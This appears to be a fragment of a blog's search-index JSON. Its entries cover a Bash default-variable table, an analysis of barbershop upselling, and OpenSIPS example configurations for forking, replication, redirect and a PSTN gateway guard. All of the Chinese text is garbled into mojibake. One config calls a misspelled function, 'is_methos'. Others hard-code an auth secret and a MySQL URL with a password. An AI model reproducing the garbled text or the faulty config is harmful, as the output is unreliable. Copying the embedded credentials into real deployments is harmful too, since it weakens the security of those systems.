å€¼å¾—æ·±å…¥é˜…è¯»ï¼Œå…³äºå¦‚ä½•demoçš„æ€è€ƒ https://kitsonkelly.com/posts/deno-is-a-browser-for-code/ ä¸é”™çš„ä»‹ç»demoçš„åšå®¢ https://kitsonkelly.com/posts jså¦‚ä½•è·å–éŸ³é¢‘è§†é¢‘ https://www.webdevdrops.com/en/how-to-access-device-cameras-with-javascript/ batså¯ä»¥ç”¨æ¥æµ‹è¯•shellè„šæœ¬ https://github.com/bats-core/bats-core æ‰‹ç»˜é£æ ¼çš„æµç¨‹å›¾ https://excalidraw.com/ ","title":"01 æ‰‹ç»˜é£æ ¼çš„æµç¨‹å›¾"},{"content":"ç”¨æ³• Parameter What does it do? ${VAR:-STRING} If VAR is empty or unset, use STRING as its value. ${VAR-STRING} If VAR is unset, use STRING as its value. ${VAR:=STRING} If VAR is empty or unset, set the value of VAR to STRING. ${VAR=STRING} If VAR is unset, set the value of VAR to STRING. ${VAR:+STRING} If VAR is not empty, use STRING as its value. ${VAR+STRING} If VAR is set, use STRING as its value. ${VAR:?STRING} Display an error if empty or unset. ${VAR?STRING} Display an error if unset. ä¾‹å­ æ‰§è¡Œä¸‹é¢çš„ä¾‹å­ï¼Œå¦‚æœç¯å¢ƒå˜é‡ä¸­ CONF çš„å€¼å­˜åœ¨ï¼Œåˆ™å– CONF çš„å€¼ï¼Œå¦åˆ™ç”¨é»˜è®¤å€¼ 7\n#/bin/bash a=${CONF:-\u0026#34;7\u0026#34;} echo $a; ","permalink":"https://wdd.js.org/shell/default-var/","summary":"ç”¨æ³• Parameter What does it do? ${VAR:-STRING} If VAR is empty or unset, use STRING as its value. ${VAR-STRING} If VAR is unset, use STRING as its value. ${VAR:=STRING} If VAR is empty or unset, set the value of VAR to STRING. ${VAR=STRING} If VAR is unset, set the value of VAR to STRING. ${VAR:+STRING} If VAR is not empty, use STRING as its value. ${VAR+STRING} If VAR is set, use STRING as its value.","title":"è®¾ç½®å˜é‡é»˜è®¤å€¼"},{"content":"1. ç†å‘åº—åˆ†ç±» ç±»åˆ« åº—é¢å¤§å° å¹¶å‘ç†å‘äººæ•° ä¸šåŠ¡èŒƒå›´ æ¶ˆè´¹è€…ç”»åƒ å®šä»· A(å•ä¸€ç†å‘ç±») è¾ƒå° 4-6 ç†å‘ã€æŸ“å‘ã€çƒ«å‘ å­¦ç”Ÿã€æ™®é€šå·¥äºº è¾ƒä½ B(ç»¼åˆæœåŠ¡ç±») è¾ƒå¤§ 12-20 ç†å‘ã€æŸ“å‘ã€çƒ«å‘ã€ç¾å®¹ã€å‡è‚¥ã€åˆ®ç—§ã€æŒ‰æ‘©ã€è„±æ¯›ç­‰ç­‰ ç™½é¢†ã€è€æ¿ç­‰æœ‰ä¸€å®šç»æµèƒ½åŠ›è€… ä¸­ä¸Š 2. å¦‚ä½•å¸å¼•é¡¾å®¢ä¸Šé—¨ï¼Ÿ ä¼˜æƒ å¡ï¼šåœ¨ç†å‘åº—è¥ä¸šä¹‹å‰ï¼Œå¾€å¾€å¯ä»¥ä»¥æä½çš„ä»·æ ¼ï¼Œæ´¾å‘ç†å‘å¡ã€‚ä¾‹å¦‚åŠç†20å…ƒç†å‘5æ¬¡è¿™æ ·çš„ç†å‘å¡ã€‚è¿™æ ·åœ¨ç†å‘åº—è¥ä¸šä¹‹åˆï¼Œå°±ä¼šæœ‰è¶³å¤Ÿçš„å®¢æˆ·ä¸Šé—¨ç†å‘ã€‚ è®¤çŸ¥åå·®ï¼šå¾ˆå¤šç†å‘åº—ä¼šé—¨å£æŒ‚ä¸ªæ¨ªå¹…: x+x+x ä»…éœ€5å…ƒã€‚å…¨åœºå¥—é¤ä»…éœ€1æŠ˜ã€‚å…¶å®è¿™äº›éƒ½æ˜¯å¸å¼•é¡¾å®¢çš„é’©å­ï¼Œè€ŒçœŸæ­£çš„å‰ææ¡ä»¶ï¼Œå¾€å¾€æ˜¯è¦åŠç†xxxxå…ƒçš„ä¼šå‘˜å¡ã€‚ 3. å¦‚ä½•å¸å¼•å®¢æˆ·æ›´å¤šçš„æ¶ˆè´¹ï¼Ÿ å¯¹äºBç±»ç†å‘åº—æ¥è¯´ï¼Œä¸€èˆ¬æƒ…å†µä¸‹é¡¾å®¢è¿›åº—ä¹‹åï¼Œå¹¶ä¸ä¼šå¯¹å…¶ç«‹å³ç†å‘ã€‚è€Œéœ€è¦ä¸€ä½æœåŠ¡å‘˜è¿›è¡Œç†å‘å‰çš„å‡†å¤‡ï¼Œä¾‹å¦‚å¤´éƒ¨æŒ‰æ‘©ã€é¢ˆéƒ¨åˆ®ç—§ã€è‚©éƒ¨æŒ‰æ‘©çš„æ”¾æ¾å‡†å¤‡ã€‚ä¹Ÿå¯èƒ½ä¼šä¸Šä¸€äº›èŒ¶æ°´ï¼Œç³–æœç“œå­ä¹‹ç±»çš„é£Ÿå“ã€‚\nè¿›å…¥ç†å‘åº—ï¼Œé™¤äº†æœ‰ç†å‘çš„æ¶ˆè´¹ä¹‹å¤–ï¼Œè¿˜å¯èƒ½çº¯åœ¨å…¶ä»–çš„æ¶ˆè´¹æœºä¼šã€‚è€Œæ¶ˆè´¹æœºä¼šçš„å‰æåœ¨äº**æœåŠ¡äººå‘˜å’Œé¡¾å®¢ä¹‹é—´çš„æ²Ÿé€šã€‚æ‰€ä»¥ä»¥ä¸ºèƒ½å¤Ÿå¯Ÿè¨€å¯¡è‰²çš„æœåŠ¡å‘˜åˆ™æ˜¾å¾—å°¤ä¸ºé‡è¦ã€‚å¦‚æœé¡¾å®¢ä¸€å¥è¯ä¹Ÿä¸è¯´ï¼Œé‚£ä¹Ÿæ˜¯æ— æ³•è®©å…¶æ›´å¤šçš„æ¶ˆè´¹çš„ã€‚å¸¸è§çš„æ²Ÿé€šæ‰‹æ³•å¦‚ä¸‹ï¼š\nå‘ç°é¡¾å®¢èº«ä¸Šçš„å°ç‘•ç–µï¼Œè¿›è€Œå’¨è¯¢é¡¾å®¢æ˜¯å¦éœ€è¦ä¸“ä¸šçš„äººå‘˜å¸®æ‚¨çœ‹çœ‹ã€‚ï¼ˆæ³¨æ„è¿™ä¸€æ­¥ä¸€å®šä¸è¦ç«‹å³æ¨èå¥—é¤æœåŠ¡ï¼Œè¿™æ ·ä¼šç«‹å³å¼•èµ·é¡¾å®¢çš„åæ„Ÿæƒ…ç»ªã€‚ï¼‰ ç»è¿‡ä¸“ä¸šäººå‘˜çš„æŸ¥çœ‹ä¹‹åï¼Œä¸€èˆ¬ä¼šå‘å®¢æˆ·æ¨èæ¯”è¾ƒä¼˜æƒ çš„ä½“éªŒä¸€æ¬¡çš„é¡¹ç›®ã€‚å› ä¸ºä½“éªŒä¸€æ¬¡å¾€å¾€æ˜¯è¯è´¹æ¯”è¾ƒå°çš„ã€‚å¦‚æœä¸Šæ¥ç»™å®¢æˆ·æ¨èä¸€ä¸¤åƒçš„å¥—é¤ï¼Œå®¢æˆ·ä¸€èˆ¬ä¼šæ‹’ç»ã€‚ ç®€å•çš„å¥—é¤ä½“éªŒè¿‡åï¼Œå¯ä»¥å‘é¡¾å®¢æ¨èå¥—é¤ï¼Œä»¥åŠå¦‚æœä½¿ç”¨å¥—é¤ï¼Œå•æ¬¡ç†ç–—ä¼šæ›´åŠ ä¼˜æƒ ã€‚ æ€»å¾—ç†å¿µå°±æ˜¯ï¼šå¾ªåºæ¸è¯±ï¼Œä¸å¯æ“ä¹‹è¿‡æ€¥\n4. å¦‚ä½•ç•™ä½é¡¾å®¢ï¼Ÿ ç†å‘åº—é¡¾å®¢ç²˜æ€§ä¸€èˆ¬æ¯”è¾ƒå°ï¼Œå‘¨å›´å››äº”å®¶ç†å‘åº—ï¼Œé¡¾å®¢å‡­ä»€ä¹ˆå†æ¬¡å…‰é¡¾ä½ è¿™å®¶å‘¢ï¼Ÿ\nç­”æ¡ˆå°±æ˜¯ï¼šä¼šå‘˜å¡\n","permalink":"https://wdd.js.org/posts/2020/05/frut12/","summary":"1. ç†å‘åº—åˆ†ç±» ç±»åˆ« åº—é¢å¤§å° å¹¶å‘ç†å‘äººæ•° ä¸šåŠ¡èŒƒå›´ æ¶ˆè´¹è€…ç”»åƒ å®šä»· A(å•ä¸€ç†å‘ç±») è¾ƒå° 4-6 ç†å‘ã€æŸ“å‘ã€çƒ«å‘ å­¦ç”Ÿã€æ™®é€šå·¥äºº è¾ƒä½ B(ç»¼åˆæœåŠ¡ç±») è¾ƒå¤§ 12-20 ç†å‘ã€æŸ“å‘ã€çƒ«å‘ã€ç¾å®¹ã€å‡è‚¥ã€åˆ®ç—§ã€æŒ‰æ‘©ã€è„±æ¯›ç­‰ç­‰ ç™½é¢†ã€è€æ¿ç­‰æœ‰ä¸€å®šç»æµèƒ½åŠ›è€… ä¸­ä¸Š 2. å¦‚ä½•å¸å¼•é¡¾å®¢ä¸Šé—¨ï¼Ÿ ä¼˜æƒ å¡ï¼šåœ¨ç†å‘åº—è¥ä¸šä¹‹å‰ï¼Œå¾€å¾€å¯ä»¥ä»¥æä½çš„ä»·æ ¼ï¼Œæ´¾å‘ç†å‘å¡ã€‚ä¾‹å¦‚åŠç†20å…ƒç†å‘5æ¬¡è¿™æ ·çš„ç†å‘å¡ã€‚è¿™æ ·åœ¨ç†å‘åº—è¥ä¸šä¹‹åˆï¼Œå°±ä¼šæœ‰è¶³å¤Ÿçš„å®¢æˆ·ä¸Šé—¨ç†å‘ã€‚ è®¤çŸ¥åå·®ï¼šå¾ˆå¤šç†å‘åº—ä¼šé—¨å£æŒ‚ä¸ªæ¨ªå¹…: x+x+x ä»…éœ€5å…ƒã€‚å…¨åœºå¥—é¤ä»…éœ€1æŠ˜ã€‚å…¶å®è¿™äº›éƒ½æ˜¯å¸å¼•é¡¾å®¢çš„é’©å­ï¼Œè€ŒçœŸæ­£çš„å‰ææ¡ä»¶ï¼Œå¾€å¾€æ˜¯è¦åŠç†xxxxå…ƒçš„ä¼šå‘˜å¡ã€‚ 3. å¦‚ä½•å¸å¼•å®¢æˆ·æ›´å¤šçš„æ¶ˆè´¹ï¼Ÿ å¯¹äºBç±»ç†å‘åº—æ¥è¯´ï¼Œä¸€èˆ¬æƒ…å†µä¸‹é¡¾å®¢è¿›åº—ä¹‹åï¼Œå¹¶ä¸ä¼šå¯¹å…¶ç«‹å³ç†å‘ã€‚è€Œéœ€è¦ä¸€ä½æœåŠ¡å‘˜è¿›è¡Œç†å‘å‰çš„å‡†å¤‡ï¼Œä¾‹å¦‚å¤´éƒ¨æŒ‰æ‘©ã€é¢ˆéƒ¨åˆ®ç—§ã€è‚©éƒ¨æŒ‰æ‘©çš„æ”¾æ¾å‡†å¤‡ã€‚ä¹Ÿå¯èƒ½ä¼šä¸Šä¸€äº›èŒ¶æ°´ï¼Œç³–æœç“œå­ä¹‹ç±»çš„é£Ÿå“ã€‚\nè¿›å…¥ç†å‘åº—ï¼Œé™¤äº†æœ‰ç†å‘çš„æ¶ˆè´¹ä¹‹å¤–ï¼Œè¿˜å¯èƒ½çº¯åœ¨å…¶ä»–çš„æ¶ˆè´¹æœºä¼šã€‚è€Œæ¶ˆè´¹æœºä¼šçš„å‰æåœ¨äº**æœåŠ¡äººå‘˜å’Œé¡¾å®¢ä¹‹é—´çš„æ²Ÿé€šã€‚æ‰€ä»¥ä»¥ä¸ºèƒ½å¤Ÿå¯Ÿè¨€å¯¡è‰²çš„æœåŠ¡å‘˜åˆ™æ˜¾å¾—å°¤ä¸ºé‡è¦ã€‚å¦‚æœé¡¾å®¢ä¸€å¥è¯ä¹Ÿä¸è¯´ï¼Œé‚£ä¹Ÿæ˜¯æ— æ³•è®©å…¶æ›´å¤šçš„æ¶ˆè´¹çš„ã€‚å¸¸è§çš„æ²Ÿé€šæ‰‹æ³•å¦‚ä¸‹ï¼š\nå‘ç°é¡¾å®¢èº«ä¸Šçš„å°ç‘•ç–µï¼Œè¿›è€Œå’¨è¯¢é¡¾å®¢æ˜¯å¦éœ€è¦ä¸“ä¸šçš„äººå‘˜å¸®æ‚¨çœ‹çœ‹ã€‚ï¼ˆæ³¨æ„è¿™ä¸€æ­¥ä¸€å®šä¸è¦ç«‹å³æ¨èå¥—é¤æœåŠ¡ï¼Œè¿™æ ·ä¼šç«‹å³å¼•èµ·é¡¾å®¢çš„åæ„Ÿæƒ…ç»ªã€‚ï¼‰ ç»è¿‡ä¸“ä¸šäººå‘˜çš„æŸ¥çœ‹ä¹‹åï¼Œä¸€èˆ¬ä¼šå‘å®¢æˆ·æ¨èæ¯”è¾ƒä¼˜æƒ çš„ä½“éªŒä¸€æ¬¡çš„é¡¹ç›®ã€‚å› ä¸ºä½“éªŒä¸€æ¬¡å¾€å¾€æ˜¯è¯è´¹æ¯”è¾ƒå°çš„ã€‚å¦‚æœä¸Šæ¥ç»™å®¢æˆ·æ¨èä¸€ä¸¤åƒçš„å¥—é¤ï¼Œå®¢æˆ·ä¸€èˆ¬ä¼šæ‹’ç»ã€‚ ç®€å•çš„å¥—é¤ä½“éªŒè¿‡åï¼Œå¯ä»¥å‘é¡¾å®¢æ¨èå¥—é¤ï¼Œä»¥åŠå¦‚æœä½¿ç”¨å¥—é¤ï¼Œå•æ¬¡ç†ç–—ä¼šæ›´åŠ ä¼˜æƒ ã€‚ æ€»å¾—ç†å¿µå°±æ˜¯ï¼šå¾ªåºæ¸è¯±ï¼Œä¸å¯æ“ä¹‹è¿‡æ€¥\n4. å¦‚ä½•ç•™ä½é¡¾å®¢ï¼Ÿ ç†å‘åº—é¡¾å®¢ç²˜æ€§ä¸€èˆ¬æ¯”è¾ƒå°ï¼Œå‘¨å›´å››äº”å®¶ç†å‘åº—ï¼Œé¡¾å®¢å‡­ä»€ä¹ˆå†æ¬¡å…‰é¡¾ä½ è¿™å®¶å‘¢ï¼Ÿ\nç­”æ¡ˆå°±æ˜¯ï¼šä¼šå‘˜å¡","title":"ç†å‘åº—çš„è¥ä¸šæ¨¡å¼åˆ†æ"},{"content":"opensips 1.x ä½¿ç”¨å„ç§flagå»è®¾ç½®ä¸€ä¸ªå‘¼å«æ˜¯å¦éœ€è¦è®°å½•ã€‚ä»opensips 2.2å¼€å§‹ï¼Œä¸å†ä½¿ç”¨flagçš„æ–¹å¼ï¼Œè€Œä½¿ç”¨ do_accounting()Â å‡½æ•°å»æ ‡è®°æ˜¯å¦éœ€è¦è®°å½•å‘¼å«ã€‚\næ³¨æ„ do_accounting()å‡½æ•°å¹¶ä¸æ˜¯æ”¶åˆ°SIPæ¶ˆæ¯åç«‹å³å†™å‘¼å«è®°å½•ï¼Œä¹Ÿä»…ä»…æ˜¯åšä¸€ä¸ªæ ‡è®°ã€‚å®é™…çš„å†™æ•°æ®åº“æˆ–è€…å†™æ—¥å¿—å‘ç”Ÿåœ¨äº‹åŠ¡æˆ–è€…dialogå®Œæˆçš„æ—¶å€™ã€‚\n","permalink":"https://wdd.js.org/opensips/ch6/acc/","summary":"opensips 1.x ä½¿ç”¨å„ç§flagå»è®¾ç½®ä¸€ä¸ªå‘¼å«æ˜¯å¦éœ€è¦è®°å½•ã€‚ä»opensips 2.2å¼€å§‹ï¼Œä¸å†ä½¿ç”¨flagçš„æ–¹å¼ï¼Œè€Œä½¿ç”¨ do_accounting()Â å‡½æ•°å»æ ‡è®°æ˜¯å¦éœ€è¦è®°å½•å‘¼å«ã€‚\næ³¨æ„ do_accounting()å‡½æ•°å¹¶ä¸æ˜¯æ”¶åˆ°SIPæ¶ˆæ¯åç«‹å³å†™å‘¼å«è®°å½•ï¼Œä¹Ÿä»…ä»…æ˜¯åšä¸€ä¸ªæ ‡è®°ã€‚å®é™…çš„å†™æ•°æ®åº“æˆ–è€…å†™æ—¥å¿—å‘ç”Ÿåœ¨äº‹åŠ¡æˆ–è€…dialogå®Œæˆçš„æ—¶å€™ã€‚","title":"accå‘¼å«è®°å½•æ¨¡å—"},{"content":"# # this example shows how to use forking on failure # log_level=3 log_stderror=1 listen=192.168.2.16 # ------------------ module loading ---------------------------------- #set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; # Uncomment this if you want to use SQL database loadmodule \u0026#34;tm.so\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; loadmodule \u0026#34;maxfwd.so\u0026#34; # ------------------------- request routing logic ------------------- # main routing logic route{ # initial sanity checks -- messages with # max_forwards==0, or excessively long requests if (!mf_process_maxfwd_header(\u0026#34;10\u0026#34;)) { sl_send_reply(\u0026#34;483\u0026#34;,\u0026#34;Too Many Hops\u0026#34;); exit; }; if ($ml \u0026gt;= 2048 ) { sl_send_reply(\u0026#34;513\u0026#34;, \u0026#34;Message too big\u0026#34;); exit; }; # skip register for testing purposes if (is_methos(\u0026#34;REGISTER\u0026#34;)) { sl_send_reply(\u0026#34;200\u0026#34;, \u0026#34;ok\u0026#34;); exit; }; if (is_method(\u0026#34;INVITE\u0026#34;)) { seturi(\u0026#34;sip:xxx@192.168.2.16:5064\u0026#34;); # if transaction broken, try other an alternative route t_on_failure(\u0026#34;1\u0026#34;); # if a provisional came, stop alternating t_on_reply(\u0026#34;1\u0026#34;); }; t_relay(); } failure_route[1] { log(1, \u0026#34;trying at alternate destination\\n\u0026#34;); seturi(\u0026#34;sip:yyy@192.168.2.16:5064\u0026#34;); t_relay(); } onreply_route[1] { log(1, \u0026#34;reply came in\\n\u0026#34;); if ($rs=~\u0026#34;18[0-9]\u0026#34;) { log(1, \u0026#34;provisional -- resetting negative failure\\n\u0026#34;); t_on_failure(\u0026#34;0\u0026#34;); }; } ","permalink":"https://wdd.js.org/opensips/ch8/serial-183/","summary":"# # this example shows how to use forking on failure # log_level=3 log_stderror=1 listen=192.168.2.16 # ------------------ module loading ---------------------------------- #set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; # Uncomment this if you want to use SQL database loadmodule \u0026#34;tm.so\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; loadmodule \u0026#34;maxfwd.so\u0026#34; # ------------------------- request routing logic ------------------- # main routing logic route{ # initial sanity checks -- messages with # max_forwards==0, or excessively long requests if (!mf_process_maxfwd_header(\u0026#34;10\u0026#34;)) { sl_send_reply(\u0026#34;483\u0026#34;,\u0026#34;Too Many Hops\u0026#34;); exit; }; if ($ml \u0026gt;= 2048 ) { sl_send_reply(\u0026#34;513\u0026#34;, \u0026#34;Message too big\u0026#34;); exit; }; # skip register for testing purposes if (is_methos(\u0026#34;REGISTER\u0026#34;)) { sl_send_reply(\u0026#34;200\u0026#34;, \u0026#34;ok\u0026#34;); exit; }; if (is_method(\u0026#34;INVITE\u0026#34;)) { seturi(\u0026#34;sip:xxx@192.","title":"serial_183"},{"content":"# # demo script showing how to set-up usrloc replication # # ----------- global configuration parameters ------------------------ log_level=3 # logging level (cmd line: -dddddddddd) log_stderror=yes # (cmd line: -E) # ------------------ module loading ---------------------------------- #set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; loadmodule \u0026#34;db_mysql.so\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; loadmodule \u0026#34;tm.so\u0026#34; loadmodule \u0026#34;maxfwd.so\u0026#34; loadmodule \u0026#34;usrloc.so\u0026#34; loadmodule \u0026#34;registrar.so\u0026#34; loadmodule \u0026#34;auth.so\u0026#34; loadmodule \u0026#34;auth_db.so\u0026#34; # ----------------- setting module-specific parameters --------------- # digest generation secret; use the same in backup server; # also, make sure that the backup server has sync\u0026#39;ed time modparam(\u0026#34;auth\u0026#34;, \u0026#34;secret\u0026#34;, \u0026#34;alsdkhglaksdhfkloiwr\u0026#34;) # ------------------------- request routing logic ------------------- # main routing logic route{ # initial sanity checks -- messages with # max_forwars==0, or excessively long requests if (!mf_process_maxfwd_header(\u0026#34;10\u0026#34;)) { sl_send_reply(\u0026#34;483\u0026#34;,\u0026#34;Too Many Hops\u0026#34;); exit; }; if ($ml \u0026gt;= 2048 ) { sl_send_reply(\u0026#34;513\u0026#34;, \u0026#34;Message too big\u0026#34;); exit; }; # if the request is for other domain use UsrLoc # (in case, it does not work, use the following command # with proper names and addresses in it) if (is_myself(\u0026#34;$rd\u0026#34;)) { if ($rm==\u0026#34;REGISTER\u0026#34;) { # verify credentials if (!www_authorize(\u0026#34;foo.bar\u0026#34;, \u0026#34;subscriber\u0026#34;)) { www_challenge(\u0026#34;foo.bar\u0026#34;, \u0026#34;0\u0026#34;); exit; }; # if ok, update contacts and ... save(\u0026#34;location\u0026#34;); # ... if this REGISTER is not a replica from our # peer server, replicate to the peer server $var(backup_ip) = \u0026#34;backup.foo.bar\u0026#34; {ip.resolve}; if (!$si==$var(backup_ip)) { t_replicate(\u0026#34;sip:backup.foo.bar:5060\u0026#34;); }; exit; }; # do whatever else appropriate for your domain log(\u0026#34;non-REGISTER\\n\u0026#34;); }; } ","permalink":"https://wdd.js.org/opensips/ch8/replicate/","summary":"# # demo script showing how to set-up usrloc replication # # ----------- global configuration parameters ------------------------ log_level=3 # logging level (cmd line: -dddddddddd) log_stderror=yes # (cmd line: -E) # ------------------ module loading ---------------------------------- #set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; loadmodule \u0026#34;db_mysql.so\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; loadmodule \u0026#34;tm.so\u0026#34; loadmodule \u0026#34;maxfwd.so\u0026#34; loadmodule \u0026#34;usrloc.so\u0026#34; loadmodule \u0026#34;registrar.so\u0026#34; loadmodule \u0026#34;auth.so\u0026#34; loadmodule \u0026#34;auth_db.so\u0026#34; # ----------------- setting module-specific parameters --------------- # digest generation secret; use the same in backup server; # also, make sure that the backup server has sync\u0026#39;ed time modparam(\u0026#34;auth\u0026#34;, \u0026#34;secret\u0026#34;, \u0026#34;alsdkhglaksdhfkloiwr\u0026#34;) # ------------------------- request routing logic ------------------- # main routing logic route{ # initial sanity checks -- messages with # max_forwars==0, or excessively long requests if (!","title":"replicate"},{"content":"# # $Id$ # # this example shows use of ser as stateless redirect server # # ------------------ module loading ---------------------------------- #set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; # ------------------------- request routing logic ------------------- # main routing logic route{ # for testing purposes, simply okay all REGISTERs if ($rm==\u0026#34;REGISTER\u0026#34;) { log(\u0026#34;REGISTER\u0026#34;); sl_send_reply(\u0026#34;200\u0026#34;, \u0026#34;ok\u0026#34;); return; }; # rewrite current URI, which is always part of destination ser rewriteuri(\u0026#34;sip:parallel@siphub.net:9\u0026#34;); # append one more URI to the destination ser append_branch(\u0026#34;sip:redirect@siphub.net:9\u0026#34;); # redirect now sl_send_reply(\u0026#34;300\u0026#34;, \u0026#34;Redirect\u0026#34;); } ","permalink":"https://wdd.js.org/opensips/ch8/redirect/","summary":"# # $Id$ # # this example shows use of ser as stateless redirect server # # ------------------ module loading ---------------------------------- #set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; # ------------------------- request routing logic ------------------- # main routing logic route{ # for testing purposes, simply okay all REGISTERs if ($rm==\u0026#34;REGISTER\u0026#34;) { log(\u0026#34;REGISTER\u0026#34;); sl_send_reply(\u0026#34;200\u0026#34;, \u0026#34;ok\u0026#34;); return; }; # rewrite current URI, which is always part of destination ser rewriteuri(\u0026#34;sip:parallel@siphub.net:9\u0026#34;); # append one more URI to the destination ser append_branch(\u0026#34;sip:redirect@siphub.","title":"redirect"},{"content":"# # $Id$ # # example: ser configured as PSTN gateway guard; PSTN gateway is located # at 192.168.0.10 # # ------------------ module loading ---------------------------------- #set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; loadmodule \u0026#34;tm.so\u0026#34; loadmodule \u0026#34;acc.so\u0026#34; loadmodule \u0026#34;rr.so\u0026#34; loadmodule \u0026#34;maxfwd.so\u0026#34; loadmodule \u0026#34;db_mysql.so\u0026#34; loadmodule \u0026#34;auth.so\u0026#34; loadmodule \u0026#34;auth_db.so\u0026#34; loadmodule \u0026#34;group.so\u0026#34; loadmodule \u0026#34;uri.so\u0026#34; # ----------------- setting module-specific parameters --------------- modparam(\u0026#34;auth_db\u0026#34;, \u0026#34;db_url\u0026#34;,\u0026#34;mysql://opensips:opensipsrw@localhost/opensips\u0026#34;) modparam(\u0026#34;auth_db\u0026#34;, \u0026#34;calculate_ha1\u0026#34;, yes) modparam(\u0026#34;auth_db\u0026#34;, \u0026#34;password_column\u0026#34;, \u0026#34;password\u0026#34;) # -- acc params -- modparam(\u0026#34;acc\u0026#34;, \u0026#34;log_level\u0026#34;, 1) # that is the flag for which we will account -- don\u0026#39;t forget to # set the same one :-) modparam(\u0026#34;acc\u0026#34;, \u0026#34;log_flag\u0026#34;, 1 ) # ------------------------- request routing logic ------------------- # main routing logic route{ /* ********* ROUTINE CHECKS ********************************** */ # filter too old messages if (!mf_process_maxfwd_header(\u0026#34;10\u0026#34;)) { log(\u0026#34;LOG: Too many hops\\n\u0026#34;); sl_send_reply(\u0026#34;483\u0026#34;,\u0026#34;Too Many Hops\u0026#34;); exit; }; if ($ml \u0026gt;= 2048 ) { sl_send_reply(\u0026#34;513\u0026#34;, \u0026#34;Message too big\u0026#34;); exit; }; /* ********* RR ********************************** */ /* grant Route routing if route headers present */ if (loose_route()) { t_relay(); exit; }; /* record-route INVITEs -- all subsequent requests must visit us */ if ($rm==\u0026#34;INVITE\u0026#34;) { record_route(); }; # now check if it really is a PSTN destination which should be handled # by our gateway; if not, and the request is an invitation, drop it -- # we cannot terminate it in PSTN; relay non-INVITE requests -- it may # be for example BYEs sent by gateway to call originator if (!$ru=~\u0026#34;sip:\\+?[0-9]+@.*\u0026#34;) { if ($rm==\u0026#34;INVITE\u0026#34;) { sl_send_reply(\u0026#34;403\u0026#34;, \u0026#34;Call cannot be served here\u0026#34;); } else { forward(); }; exit; }; # account completed transactions via syslog setflag(1); # free call destinations ... no authentication needed if ( is_user_in(\u0026#34;Request-URI\u0026#34;, \u0026#34;free-pstn\u0026#34;) /* free destinations */ || $ru=~\u0026#34;sip:[79][0-9][0-9][0-9]@.*\u0026#34; /* local PBX */ || $ru=~\u0026#34;sip:98[0-9][0-9][0-9][0-9]\u0026#34;) { log(\u0026#34;free call\u0026#34;); } else if ($si==192.168.0.10) { # our gateway doesn\u0026#39;t support digest authentication; # verify that a request is coming from it by source # address log(\u0026#34;gateway-originated request\u0026#34;); } else { # in all other cases, we need to check the request against # access control lists; first of all, verify request # originator\u0026#39;s identity if (!proxy_authorize(\t\u0026#34;gateway\u0026#34; /* realm */, \u0026#34;subscriber\u0026#34; /* table name */)) { proxy_challenge( \u0026#34;gateway\u0026#34; /* realm */, \u0026#34;0\u0026#34; /* no qop */ ); exit; }; # authorize only for INVITEs -- RR/Contact may result in weird # things showing up in d-uri that would break our logic; our # major concern is INVITE which causes PSTN costs if ($rm==\u0026#34;INVITE\u0026#34;) { # does the authenticated user have a permission for local # calls (destinations beginning with a single zero)? # (i.e., is he in the \u0026#34;local\u0026#34; group?) if ($ru=~\u0026#34;sip:0[1-9][0-9]+@.*\u0026#34;) { if (!is_user_in(\u0026#34;credentials\u0026#34;, \u0026#34;local\u0026#34;)) { sl_send_reply(\u0026#34;403\u0026#34;, \u0026#34;No permission for local calls\u0026#34;); exit; }; # the same for long-distance (destinations begin with two zeros\u0026#34;) } else if ($ru=~\u0026#34;sip:00[1-9][0-9]+@.*\u0026#34;) { if (!is_user_in(\u0026#34;credentials\u0026#34;, \u0026#34;ld\u0026#34;)) { sl_send_reply(\u0026#34;403\u0026#34;, \u0026#34; no permission for LD \u0026#34;); exit; }; # the same for international calls (three zeros) } else if ($ru=~\u0026#34;sip:000[1-9][0-9]+@.*\u0026#34;) { if (!is_user_in(\u0026#34;credentials\u0026#34;, \u0026#34;int\u0026#34;)) { sl_send_reply(\u0026#34;403\u0026#34;, \u0026#34;International permissions needed\u0026#34;); exit; }; # everything else (e.g., interplanetary calls) is denied } else { sl_send_reply(\u0026#34;403\u0026#34;, \u0026#34;Forbidden\u0026#34;); exit; }; }; # INVITE to authorized PSTN }; # authorized PSTN # if you have passed through all the checks, let your call go to GW! rewritehostport(\u0026#34;192.168.0.10:5060\u0026#34;); # forward the request now if (!t_relay()) { sl_reply_error(); exit; }; } ","permalink":"https://wdd.js.org/opensips/ch8/pstn/","summary":"# # $Id$ # # example: ser configured as PSTN gateway guard; PSTN gateway is located # at 192.168.0.10 # # ------------------ module loading ---------------------------------- #set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; loadmodule \u0026#34;tm.so\u0026#34; loadmodule \u0026#34;acc.so\u0026#34; loadmodule \u0026#34;rr.so\u0026#34; loadmodule \u0026#34;maxfwd.so\u0026#34; loadmodule \u0026#34;db_mysql.so\u0026#34; loadmodule \u0026#34;auth.so\u0026#34; loadmodule \u0026#34;auth_db.so\u0026#34; loadmodule \u0026#34;group.so\u0026#34; loadmodule \u0026#34;uri.so\u0026#34; # ----------------- setting module-specific parameters --------------- modparam(\u0026#34;auth_db\u0026#34;, \u0026#34;db_url\u0026#34;,\u0026#34;mysql://opensips:opensipsrw@localhost/opensips\u0026#34;) modparam(\u0026#34;auth_db\u0026#34;, \u0026#34;calculate_ha1\u0026#34;, yes) modparam(\u0026#34;auth_db\u0026#34;, \u0026#34;password_column\u0026#34;, \u0026#34;password\u0026#34;) # -- acc params -- modparam(\u0026#34;acc\u0026#34;, \u0026#34;log_level\u0026#34;, 1) # that is the flag for which we will account -- don\u0026#39;t forget to # set the same one :-) modparam(\u0026#34;acc\u0026#34;, \u0026#34;log_flag\u0026#34;, 1 ) # ------------------------- request routing logic ------------------- # main routing logic route{ /* ********* ROUTINE CHECKS ********************************** 